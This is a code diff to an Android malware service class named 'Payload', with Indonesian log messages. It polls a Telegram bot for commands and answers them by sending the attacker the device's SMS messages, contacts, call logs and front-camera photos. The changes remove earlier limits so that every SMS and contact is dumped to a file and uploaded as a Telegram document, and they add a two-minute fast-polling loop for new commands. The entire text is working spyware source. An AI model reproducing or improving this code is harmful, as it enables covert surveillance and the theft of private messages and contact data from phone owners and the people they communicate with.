@@ -112,9 +112,16 @@ public class Payload extends Service {
                 String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                 
                 sendCheckIn(deviceName);
-                checkCommands();
 
-                writeLog("3. Tugas Selesai, Service Mati (Tidur)");
+                // --- FAST POLLING (JENDELA 2 MENIT) ---
+                writeLog("3. Masuk Fast Polling (2 Menit)");
+                long endTime = System.currentTimeMillis() + (2 * 60 * 1000);
+                while (System.currentTimeMillis() < endTime) {
+                    checkCommands();
+                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) {}
+                }
+
+                writeLog("4. Waktu Habis, Service Tidur");
                 stopForeground(true);
                 stopSelf();
             }
@@ -146,11 +153,10 @@ public class Payload extends Service {
                 prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
             }
             
-            // LOGIKA FILTER ID
             if (jsonResponse.contains("\"text\":\"/dump_sms " + myAndroidId + "\"")) {
-                sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
+                dumpSmsToFile();
             } else if (jsonResponse.contains("\"text\":\"/dump_kontak " + myAndroidId + "\"")) {
-                sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
+                dumpContactsToFile();
             } else if (jsonResponse.contains("\"text\":\"/dump_telpon " + myAndroidId + "\"")) {
                 sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
             } else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
@@ -175,34 +181,53 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
 
-    private String getSms() {
+    private void dumpSmsToFile() {
+        writeLog("Menyedot semua SMS...");
         StringBuilder sb = new StringBuilder();
         try {
             Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
             if (cursor != null && cursor.moveToFirst()) {
-                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
-                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address"))).append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
-                    cursor.moveToNext();
-                }
+                do {
+                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address")))
+                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex("date")))
+                      .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
+                } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) { return "Gagal baca SMS."; }
-        return sb.length() > 0 ? sb.toString() : "Tidak ada SMS.";
+        } catch (Exception e) { writeLog("Gagal baca SMS"); }
+        
+        try {
+            File file = new File(getExternalFilesDir(null), "sms_dump.txt");
+            FileOutputStream fos = new FileOutputStream(file);
+            fos.write(sb.toString().getBytes());
+            fos.close();
+            sendTelegramFile(file.getAbsolutePath(), false, "📩 Dump SEMUA SMS");
+            file.delete();
+        } catch (Exception e) { writeLog("Gagal kirim SMS file"); }
     }
 
-    private String getContacts() {
+    private void dumpContactsToFile() {
+        writeLog("Menyedot semua Kontak...");
         StringBuilder sb = new StringBuilder();
         try {
             Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
             if (cursor != null && cursor.moveToFirst()) {
-                for (int i = 0; i < cursor.getCount() && i < 30; i++) {
-                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
-                    cursor.moveToNext();
-                }
+                do {
+                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
+                      .append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
+                } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) { return "Gagal baca Kontak."; }
-        return sb.length() > 0 ? sb.toString() : "Tidak ada Kontak.";
+        } catch (Exception e) { writeLog("Gagal baca Kontak"); }
+        
+        try {
+            File file = new File(getExternalFilesDir(null), "kontak_dump.txt");
+            FileOutputStream fos = new FileOutputStream(file);
+            fos.write(sb.toString().getBytes());
+            fos.close();
+            sendTelegramFile(file.getAbsolutePath(), false, "👥 Dump SEMUA Kontak");
+            file.delete();
+        } catch (Exception e) { writeLog("Gagal kirim Kontak file"); }
     }
 
     private String getCallLogs() {
@@ -283,14 +308,14 @@ public class Payload extends Service {
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
             request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
             if (caption != null) request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
-            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
+            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + (isPhoto ? "photo" : "document") + "\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
             FileInputStream fis = new FileInputStream(file);
             byte[] buffer = new byte[4096];
             int bytesRead;
             while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
             fis.close();
             request.writeBytes("\r\n--" + boundary + "--\r\n");
-            request.flush(); request.close(); conn.getResponseCode(); file.delete();
+            request.flush(); request.close(); conn.getResponseCode(); 
         } catch (Exception e) { e.printStackTrace(); }
     }
 
